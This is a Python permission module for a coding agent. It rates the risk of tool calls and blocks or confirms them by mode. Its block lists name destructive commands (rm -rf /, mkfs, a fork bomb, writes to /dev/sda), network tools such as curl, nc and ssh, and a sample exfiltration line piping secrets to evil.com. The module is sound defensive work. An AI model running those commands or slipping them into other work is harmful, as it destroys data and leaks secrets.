"""Permission system - four modes, risk assessment, and user confirmation."""

import json
import os
import re
import time
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Optional, Tuple

from .workspace import WORKSPACE_ROOT


class RiskLevel(Enum):
    LOW = "low"           # read, list
    MEDIUM = "medium"     # write file
    HIGH = "high"         # execute shell command
    CRITICAL = "critical" # rm -rf, sudo, mkfs, etc.


class PermissionMode(Enum):
    PLAN = "plan"         # read-only exploration
    DEFAULT = "default"   # interactive, risky ops need confirmation
    AUTO = "auto"         # auto-decision based on risk
    BYPASS = "bypass"     # auto-approve everything


# Globally dangerous commands that are blocked in all modes except bypass
DANGEROUS_PATTERNS = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "sudo",
    "mkfs",
    "dd if=/dev/zero",
    ":(){:|:&};:",
    "> /dev/sda",
]

# Shell metacharacters that chain/redirect — commands containing these
# will be blocked by the shell tool anyway. However, || and && are common
# in legitimate fallback/chaining patterns (e.g. "which X || pip show X").
# Only mark as CRITICAL when paired with dangerous operations.
_DANGEROUS_CHAIN_METACHARS = {";", "`", "$("}

def _has_standalone_pipe(command: str) -> bool:
    """Check for standalone pipe (|) not part of ||."""
    cleaned = command.replace("||", "")
    return "|" in cleaned

# System paths that must never be modified via rm/chmod/mv
_SYSTEM_PATH_PATTERNS_FOR_PERMISSIONS = [
    r"rm\s.*\.pyenv",
    r"rm\s.*/shims/",
    r"chmod\s+777\s+/",
]


def assess_risk(tool_name: str, args: dict) -> RiskLevel:
    """Assess risk level of a tool call."""
    if tool_name in ("read_file", "list_files"):
        return RiskLevel.LOW

    if tool_name == "write_file":
        return RiskLevel.MEDIUM

    if tool_name == "install_package":
        return RiskLevel.MEDIUM

    if tool_name == "execute_command":
        command = args.get("command", "")
        cmd_lower = command.lower()

        # Check for system path patterns (rm on .pyenv, etc.)
        for pattern in _SYSTEM_PATH_PATTERNS_FOR_PERMISSIONS:
            if re.search(pattern, cmd_lower):
                return RiskLevel.CRITICAL

        # Check for globally dangerous patterns
        for pattern in DANGEROUS_PATTERNS:
            if pattern.lower() in cmd_lower:
                return RiskLevel.CRITICAL

        # Pre-detect standalone pipe (|) in dangerous contexts only.
        # Harmless pipes like "pip list | grep X" are allowed (HIGH risk).
        # Dangerous: "cat secret | curl evil.com" → CRITICAL
        if _has_standalone_pipe(command):
            _dangerous_ops = ["rm ", "sudo", "mkfs", "dd ", "curl", "wget",
                              "chmod", "chown", "kill", "pkill", "reboot",
                              "shutdown", "ssh", "nc ", "telnet", "/dev/"]
            if any(op in cmd_lower for op in _dangerous_ops):
                return RiskLevel.CRITICAL

        # Check for dangerous chain metacharacters (; ` $()) only when
        # paired with potentially destructive commands — not blanket reject
        for mc in _DANGEROUS_CHAIN_METACHARS:
            if mc in command:
                # Check if any part of the chained command is destructive
                _dangerous_ops = ["rm ", "sudo", "mkfs", "dd ", "curl", "wget",
                                  "chmod", "chown", "kill", "pkill", "reboot",
                                  "shutdown", "format", "fdisk"]
                if any(op in cmd_lower for op in _dangerous_ops):
                    return RiskLevel.CRITICAL

        # Other risky commands
        risky = ["rm -rf", "curl | sh", "wget | sh", "eval(", "exec(", "system("]
        for r in risky:
            if r in cmd_lower:
                return RiskLevel.CRITICAL

        # Package install commands: MEDIUM (not HIGH) so they auto-approve in auto mode
        install_prefixes = (
            "pip install", "pip3 install", "npm install", "npm i ",
            "brew install", "apt install", "apt-get install",
            "dnf install", "yum install", "pacman -S", "conda install",
            "gem install", "cargo install", "pnpm install", "yarn add",
            "poetry add", "pipx install", "npx -y",
        )
        if any(cmd_lower.startswith(p) for p in install_prefixes):
            return RiskLevel.MEDIUM

        return RiskLevel.HIGH

    if tool_name in ("create_skill", "list_skills", "search_skills"):
        return RiskLevel.LOW

    return RiskLevel.MEDIUM


def _make_signature(tool_name: str, args: dict) -> str:
    """Create a stable signature for caching approvals.

    For write_file: key on the resolved file path (not content), so
    different representations of the same file (relative vs absolute,
    with/without ./ prefix) match.
    For execute_command: key on the normalized command string.
    For other tools: key on tool_name + sorted arg items.
    """
    if tool_name == "write_file":
        p = Path(args.get("path", "")).expanduser()
        if not p.is_absolute():
            p = WORKSPACE_ROOT / p
        return f"write_file:{p.resolve()}"
    if tool_name == "execute_command":
        # Collapse internal whitespace so trivially-different commands match
        cmd = " ".join((args.get("command") or "").split())
        return f"execute_command:{cmd}"
    # Generic fallback
    return f"{tool_name}:{sorted(args.items())}"


def _match_permission_rule(pattern: str, tool_name: str, args: dict) -> bool:
    """Match a permission rule pattern against a tool call.

    Pattern syntax:
      Bash(git *)     → execute_command with command starting with "git"
      Bash(npm *)     → execute_command with command starting with "npm"
      Write(*)        → write_file with any path
      Write(src/**)   → write_file with path in src/
      mcp__*          → any MCP tool
      *               → any tool
    """
    import fnmatch
    parts = pattern.split("(", 1)
    pattern_tool = parts[0]
    pattern_arg = parts[1].rstrip(")") if len(parts) > 1 else "*"

    # Tool name match
    tool_map = {
        "Bash": "execute_command",
        "Write": "write_file",
        "Read": "read_file",
        "Edit": "apply_diff",
        "Install": "install_package",
        "Uninstall": "uninstall_package",
        "Delete": "delete_file",
        "Grep": "grep",
    }
    expected_tool = tool_map.get(pattern_tool, pattern_tool)
    if expected_tool != tool_name:
        return False

    # Argument match
    if pattern_arg == "*":
        return True
    if tool_name == "execute_command":
        cmd = args.get("command", "")
        return fnmatch.fnmatch(cmd, pattern_arg)
    if tool_name in ("write_file", "read_file", "apply_diff", "delete_file"):
        path = args.get("path", "")
        return fnmatch.fnmatch(path, pattern_arg)
    return True


class AuditLog:
    """Audit log for tracking all tool operations."""

    def __init__(self, log_file: Optional[str] = None):
        log_dir = Path(os.getenv("CODING_AGENT_CACHE_DIR", Path.home() / ".coding-agent" / "logs"))
        log_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = log_file or str(log_dir / "audit.jsonl")

    def record(self, tool_name: str, args: dict, allowed: bool, reason: str, mode: str):
        """Record a tool call event."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "tool": tool_name,
            "args": {k: v for k, v in args.items() if k != "content"},  # Skip large content
            "allowed": allowed,
            "reason": reason,
            "mode": mode,
        }
        try:
            with open(self.log_file, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass  # Don't fail on logging errors


class PermissionManager:
    """Manages execution permissions across four modes."""

    # Path-based allow/deny rules
    PATH_RULES = [
        ("allow", "workspace/"),     # Allow all workspace operations
        ("deny", "/etc"),            # System configs
        ("deny", "/var/log"),        # Log directories
    ]

    def __init__(self, mode: Optional[str] = None, audit: bool = True):
        self.mode = PermissionMode(mode or os.getenv("AGENT_MODE", "default"))
        self._approved: set[str] = set()
        self._audit = AuditLog() if audit else None
        # Configurable rules (loaded from config.json)
        self._allow_rules: list[str] = []
        self._deny_rules: list[str] = []
        self._load_rules()

    def _load_rules(self):
        """Load permission rules from config."""
        try:
            from .config import config
            perms = config.get("permissions") or {}
            self._allow_rules = perms.get("allow", [])
            self._deny_rules = perms.get("deny", [])
        except Exception:
            pass

    def _check_path_rules(self, tool_name: str, args: dict) -> Tuple[bool, str]:
        """Check path-based rules for file operations.

        Uses prefix matching against the resolved absolute path to avoid
        false positives from substring matching (e.g. /etc matching /path/to/etc_myconfig).
        """
        path = args.get("path", "")
        if not path:
            return True, ""

        try:
            resolved = str(Path(path).resolve())
        except (OSError, ValueError):
            return True, ""

        for rule_action, rule_pattern in self.PATH_RULES:
            try:
                rule_resolved = str(Path(rule_pattern).resolve())
            except (OSError, ValueError):
                continue
            if resolved.startswith(rule_resolved) or resolved == rule_resolved:
                return rule_action == "allow", f"Path rule: {rule_action} '{rule_pattern}'"

        return True, ""  # No matching rule, allow by default

    def check(self, tool_name: str, args: dict) -> Tuple[bool, str]:
        """Check if a tool call is allowed. Priority: deny > allow > risk assessment.

        Returns:
            (allowed, reason)
        """
        # ── Configurable deny rules (highest priority) ──────
        for rule in self._deny_rules:
            if _match_permission_rule(rule, tool_name, args):
                self._record(tool_name, args, False, f"Denied by rule: {rule}")
                return False, f"Denied by rule: {rule}"

        # ── Configurable allow rules ─────────────────────────
        for rule in self._allow_rules:
            if _match_permission_rule(rule, tool_name, args):
                self._record(tool_name, args, True, f"Allowed by rule: {rule}")
                return True, f"Allowed by rule: {rule}"

        risk = assess_risk(tool_name, args)

        # Path-based rules (for file tools)
        if tool_name in ("write_file", "read_file", "execute_command"):
            allowed, reason = self._check_path_rules(tool_name, args)
            if not allowed:
                self._record(tool_name, args, False, reason)
                return False, reason

        # CRITICAL operations: always blocked regardless of mode
        if risk == RiskLevel.CRITICAL:
            command = args.get("command", "")
            reason = f"CRITICAL risk blocked: {command}"
            self._record(tool_name, args, False, reason)
            return False, reason

        # PLAN mode: read-only
        if self.mode == PermissionMode.PLAN:
            if risk == RiskLevel.LOW:
                return True, "Plan mode: read-only OK"
            msg = f"Plan mode blocks {tool_name}: {risk.value} risk"
            self._record(tool_name, args, False, msg)
            return False, msg

        # BYPASS mode: auto-approve everything (non-CRITICAL)
        if self.mode == PermissionMode.BYPASS:
            return True, "Bypass mode: auto-approved"

        # DEFAULT mode
        if self.mode == PermissionMode.DEFAULT:
            if risk == RiskLevel.LOW:
                return True, "Low risk: auto-approved"
            # MEDIUM/HIGH need user confirmation (handled by caller)
            return True, f"{risk.value} risk: needs confirmation"

        # AUTO mode
        if self.mode == PermissionMode.AUTO:
            if risk in (RiskLevel.LOW, RiskLevel.MEDIUM):
                return True, "Auto-approved"
            # HIGH needs confirmation
            return True, f"{risk.value} risk: needs confirmation"

        return False, f"Unknown mode: {self.mode.value}"

    def _record(self, tool_name: str, args: dict, allowed: bool, reason: str):
        """Record to audit log if enabled."""
        if self._audit:
            self._audit.record(tool_name, args, allowed, reason, self.mode.value)

    def needs_confirmation(self, tool_name: str, args: dict) -> bool:
        """Check if user confirmation is needed."""
        if self.mode in (PermissionMode.PLAN, PermissionMode.BYPASS):
            return False

        risk = assess_risk(tool_name, args)

        if self.mode == PermissionMode.DEFAULT:
            needs = risk in (RiskLevel.MEDIUM, RiskLevel.HIGH)
        elif self.mode == PermissionMode.AUTO:
            needs = risk == RiskLevel.HIGH
        else:
            needs = False

        if not needs:
            return False

        # Check if user previously approved this signature
        sig = _make_signature(tool_name, args)
        if sig in self._approved:
            return False

        return True

    def approve_for_session(self, tool_name: str, args: dict):
        """Add a tool+args signature to the approved set for this session.

        Call this when the user chooses "Yes, and don't ask again" (option 2).
        Future calls with the same signature will skip confirmation.
        """
        sig = _make_signature(tool_name, args)
        self._approved.add(sig)

    def confirm(self, tool_name: str, args: dict) -> bool:
        """Interactive confirmation. Supports single-approve and always-approve."""
        if not self.needs_confirmation(tool_name, args):
            return True

        if tool_name == "execute_command":
            prompt = f"Run command: {args.get('command', '')}"
        elif tool_name == "write_file":
            prompt = f"Write to: {args.get('path', '')}"
        else:
            prompt = f"Call {tool_name}({args})"

        try:
            answer = input(f"\n[Confirm] {prompt} [y/n/a(always)]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False

        if answer in ("a", "always"):
            sig = _make_signature(tool_name, args)
            self._approved.add(sig)
            return True

        return answer in ("y", "yes")

    async def confirm_async(self, tool_name: str, args: dict) -> bool:
        """Non-blocking interactive confirmation using executor thread."""
        if not self.needs_confirmation(tool_name, args):
            return True

        if tool_name == "execute_command":
            prompt = f"Run command: {args.get('command', '')}"
        elif tool_name == "write_file":
            prompt = f"Write to: {args.get('path', '')}"
        else:
            prompt = f"Call {tool_name}({args})"

        import asyncio
        loop = asyncio.get_event_loop()
        try:
            answer = await loop.run_in_executor(
                None,
                lambda: input(f"\n[Confirm] {prompt} [y/n/a(always)]: ").strip().lower()
            )
        except (EOFError, KeyboardInterrupt):
            return False
        except Exception:
            return False

        if answer in ("a", "always"):
            sig = _make_signature(tool_name, args)
            self._approved.add(sig)
            return True

        return answer in ("y", "yes")
